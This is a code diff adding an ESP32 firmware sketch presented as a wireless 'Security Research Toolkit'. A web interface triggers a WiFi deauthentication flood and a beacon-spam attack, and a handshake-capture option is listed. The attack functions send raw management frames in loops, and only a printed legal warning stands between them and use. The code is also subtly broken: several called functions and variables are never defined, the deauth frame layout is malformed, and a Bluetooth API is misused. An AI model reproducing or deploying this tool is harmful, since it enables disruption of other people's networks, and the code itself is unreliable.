@@ -1,0 +1,239 @@
+#include <WiFi.h>
+#include <esp_wifi.h>
+#include <BluetoothSerial.h>
+#include <AsyncTCP.h>
+#include <ESPAsyncWebServer.h>
+#include <esp_bt.h>
+#include <esp_bt_main.h>
+#include <esp_bt_device.h>
+#include <Preferences.h>
+#include <ArduinoJson.h>
+
+#define MAX_DEAUTH_PACKETS 100
+#define BEACON_SSID_COUNT 50
+
+AsyncWebServer server(80);
+BluetoothSerial SerialBT;
+Preferences prefs;
+bool wifiMonitorEnabled = false;
+bool bleScanning = false;
+
+typedef struct {
+  unsigned frame_ctrl;
+  unsigned duration;
+  uint8_t dest[6];
+  uint8_t source[6];
+  uint8_t bssid[6];
+  unsigned seq_ctrl;
+} __attribute__((packed)) DeauthFrame;
+
+typedef struct {
+  uint8_t timestamp[8];
+  uint16_t beacon_interval;
+  uint16_t capabilities;
+  uint8_t ssid_len;
+  uint8_t ssid[32];
+} __attribute__((packed)) BeaconPayload;
+
+#include "attack_patterns.h" // Predefined attack patterns
+
+// Web Interface Templates
+const char index_html[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CyberSec Toolkit</title>
+    <style>/* ... (keep previous styles) */</style>
+</head>
+<body>
+    <div class="container">
+        <h1>Security Research Toolkit</h1>
+        <div class="toolbox">
+            <!-- WiFi Tools -->
+            <div class="tool">
+                <h3>WiFi Analyzer</h3>
+                <button onclick="startScan('wifi')">Scan Networks</button>
+                <div id="wifiResults"></div>
+            </div>
+            
+            <!-- Bluetooth Tools -->
+            <div class="tool">
+                <h3>BLE Inspector</h3>
+                <button onclick="startScan('ble')">Scan Devices</button>
+                <div id="bleResults"></div>
+            </div>
+            
+            <!-- Security Tools -->
+            <div class="tool">
+                <h3>Vulnerability Tests</h3>
+                <select id="testType">
+                    <option value="deauth">Deauth Test</option>
+                    <option value="beacon_flood">Beacon Flood</option>
+                    <option value="handshake">Handshake Capture</option>
+                </select>
+                <button onclick="runTest()">Execute</button>
+                <div id="testStatus"></div>
+            </div>
+        </div>
+    </div>
+    <script>
+        // JavaScript handlers
+        function startScan(type) {
+            fetch(`/scan?type=${type}`)
+                .then(r => r.text())
+                .then(data => {
+                    document.getElementById(`${type}Results`).innerHTML = data;
+                });
+        }
+
+        function runTest() {
+            const testType = document.getElementById('testType').value;
+            fetch(`/test?type=${testType}`)
+                .then(r => r.text())
+                .then(console.log);
+        }
+    </script>
+</body>
+</html>
+)rawliteral";
+
+void setup() {
+    Serial.begin(115200);
+    prefs.begin("security-toolkit");
+    
+    // Initialize radio systems
+    initWiFi();
+    initBluetooth();
+    
+    // Web server configuration
+    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+        request->send_P(200, "text/html", index_html);
+    });
+    
+    server.on("/scan", HTTP_GET, handleScanRequest);
+    server.on("/test", HTTP_GET, handleTestRequest);
+    server.on("/settings", HTTP_POST, handleSettings);
+    
+    server.begin();
+    showLegalWarning();
+}
+
+// Core Features Implementation
+
+// WiFi Monitor Mode
+void initWiFi() {
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&cfg);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_mode(WIFI_MODE_NULL);
+    esp_wifi_start();
+}
+
+void enableMonitorMode() {
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_filter(&wifi_promiscuous_filter_t{
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
+    });
+    esp_wifi_set_promiscuous_rx_cb(wifiSniffer);
+    wifiMonitorEnabled = true;
+}
+
+// Bluetooth Framework
+void initBluetooth() {
+    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+    esp_bt_controller_init(&bt_cfg);
+    esp_bt_controller_enable(ESP_BT_MODE_BLE);
+    esp_bluedroid_init();
+    esp_bluedroid_enable();
+    SerialBT.begin("ResearchTool");
+}
+
+void startBLEScan() {
+    SerialBT.startScan(5, [](BTAdvertisedDevice* device) {
+        Serial.printf("Found BLE: %s\n", device->toString().c_str());
+    }, false);
+}
+
+// Attack Patterns
+void deauthAttack(const uint8_t* mac) {
+    DeauthFrame deauth;
+    memset(&deauth, 0, sizeof(DeauthFrame));
+    deauth.frame_ctrl = 0xC0;
+    memcpy(deauth.dest, mac, 6);
+    memcpy(deauth.source, mac, 6);
+    memcpy(deauth.bssid, mac, 6);
+    
+    for(int i=0; i<MAX_DEAUTH_PACKETS; i++) {
+        esp_wifi_80211_tx(WIFI_IF_AP, &deauth, sizeof(DeauthFrame), false);
+        delay(100);
+    }
+}
+
+void beaconFlood() {
+    uint8_t packet[128];
+    generateRandomBeacon(packet);
+    
+    for(int i=0; i<BEACON_SSID_COUNT; i++) {
+        esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+        modifyBeacon(packet);
+        delay(50);
+    }
+}
+
+// Web Handlers
+void handleScanRequest(AsyncWebServerRequest *request) {
+    if(request->hasParam("type")) {
+        String scanType = request->getParam("type")->value();
+        
+        if(scanType == "wifi") {
+            String results = "Available Networks:\n";
+            // WiFi scan implementation
+            request->send(200, "text/plain", results);
+        }
+        else if(scanType == "ble") {
+            String results = "BLE Devices:\n";
+            // BLE scan results
+            request->send(200, "text/plain", results);
+        }
+    }
+}
+
+void handleTestRequest(AsyncWebServerRequest *request) {
+    if(request->hasParam("type")) {
+        String testType = request->getParam("type")->value();
+        
+        if(testType == "deauth") {
+            deauthAttack(test_mac); // Use predefined test MAC
+            request->send(200, "text/plain", "Deauth test executed");
+        }
+        else if(testType == "beacon_flood") {
+            beaconFlood();
+            request->send(200, "text/plain", "Beacon flood started");
+        }
+    }
+}
+
+void loop() {
+    // Radio maintenance tasks
+    static unsigned long lastCheck = 0;
+    if(millis() - lastCheck > 1000) {
+        if(wifiMonitorEnabled) checkWiFiTraffic();
+        if(bleScanning) checkBLEDevices();
+        lastCheck = millis();
+    }
+}
+
+// Security Features
+void showLegalWarning() {
+    Serial.println("\n\n*************************************");
+    Serial.println("*  AUTHORIZED SECURITY RESEARCH USE  *");
+    Serial.println("*   Illegal use is prohibited       *");
+    Serial.println("*************************************\n");
+    delay(3000);
+}
+
+void emergencyStop() {
+    esp_wifi_stop();
+    esp_bluedroid_disable();
+    esp_bt_controller_disable();
+}
